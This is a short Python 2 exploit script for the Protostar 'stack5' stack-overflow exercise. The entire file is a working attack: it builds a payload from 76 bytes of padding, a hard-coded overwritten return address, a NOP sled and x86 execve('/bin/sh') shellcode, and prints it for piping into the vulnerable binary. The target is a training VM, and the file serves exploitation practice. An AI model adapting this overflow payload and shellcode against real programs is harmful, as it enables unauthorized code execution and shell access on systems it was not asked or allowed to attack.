#!/usr/bin/python

import struct

#NOTE
#This exploit won't work outside protostar vm if you didn't change the stack pointer. 
#Usage:
#./exploit.py | ./stack5
PAD = "A" * 76

STACK = struct.pack("I" , 0xbffff6c0 + 10)
#Change the value of the pointer from return to win function.
NOPS = "\x90" * 100

SHELL = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

exploit = PAD + STACK  + NOPS + SHELL
print exploit
